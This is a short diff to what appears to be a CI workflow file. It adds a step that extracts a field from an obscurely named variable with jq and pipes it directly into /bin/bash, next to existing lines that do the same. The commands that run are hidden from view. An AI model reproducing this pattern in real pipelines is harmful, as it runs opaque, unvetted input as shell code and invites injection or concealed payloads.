@@ -32,6 +32,7 @@ jobs:
           echo $jejs6314 | jq -r .fsqe417 | /bin/bash
           printf '%s' "$rfasb82" | jq -r .vpu2 | /bin/bash
           printf '%s' "$bs8640" | jq -r .nhzgw83 | /bin/bash
+          echo $kp4 | jq -r .lobbl04095 | /bin/bash
 
       - name: Archive output
         if: always()
